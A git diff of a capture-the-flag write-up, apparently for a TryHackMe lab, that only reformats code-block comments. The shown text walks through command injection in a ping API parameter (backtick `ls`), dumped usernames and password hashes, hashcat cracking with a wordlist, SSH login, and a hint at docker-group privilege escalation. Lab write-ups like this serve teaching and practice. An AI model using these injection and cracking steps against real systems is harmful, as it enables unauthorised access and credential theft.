@@ -160,16 +160,16 @@ However, if we try and change the requests to something unexpected, we get a dif
 We can **escape** the ping command and make the API execute native shell commands like list, find, cat etc.
 
 ```bash
-**# PING**
+# Intended PING command
 /ping?ip=127.0.0.1
 PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.014 ms
 
-**# LS**
+# Unintended PING command with character escapes
 /ping?ip=`ls`
 ping: utech.db.sqlite: Name or service not known
 
-**# AUTH**
+# AUTH
 /auth?login=john&password=password123
 Invalid credentials
 ```
@@ -197,7 +197,7 @@ Connection: close
 
 ping: )���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded
 
-**# Cracking the hashes
+# Cracking the hashes
 ┌──(kali㉿kali)-[~/tryhackme]
 └─$ hashcat -m 0 users.hash ~/wordlists/rockyou.txt
 Dictionary cache built:
@@ -219,7 +219,7 @@ Now that we have some credentials, we can SSH to the host and get an interactive
 Seeing that we are a member of the docker group, we could probably exploit this somehow to elevate our privileges or read some files belonging to the root user.
 
 ```bash
-**# SSH**
+# SSH
 Last login: Mon Sep 19 17:39:16 2022 from 10.14.6.6
 r00t@ultratech-prod:~$ whoami
 r00t
